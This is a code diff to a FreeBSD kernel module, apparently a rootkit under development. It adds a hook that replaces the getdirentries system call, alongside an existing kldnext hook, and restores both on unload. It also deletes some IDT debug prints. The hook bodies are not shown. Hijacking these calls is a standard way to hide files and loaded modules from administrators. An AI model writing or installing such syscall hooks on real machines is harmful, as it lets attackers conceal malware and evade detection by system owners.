@@ -50,12 +50,10 @@ static int load(struct module *module, int cmd, void *arg) {
 		printf("system call loaded at offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
 		printf("kldnext hooked\n");
+		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
+		printf("getdirentries hooked\n");
 
-		printf("%p\n", idt)
-		printf("%p\n", idt[0])
-		printf("%p\n", idt[0][0])
-		printf("%p\n", idt[1])
-		printf("%p\n", idt[0][1])
+		
 		
 		break;
 
@@ -63,6 +61,8 @@ static int load(struct module *module, int cmd, void *arg) {
 		printf("system call unloaded from offset %d.\n", offset);
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
 		printf("kldnext unhooked\n");
+		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+		printf("getdirentries unhooked\n");
 		break;
 
 	default:
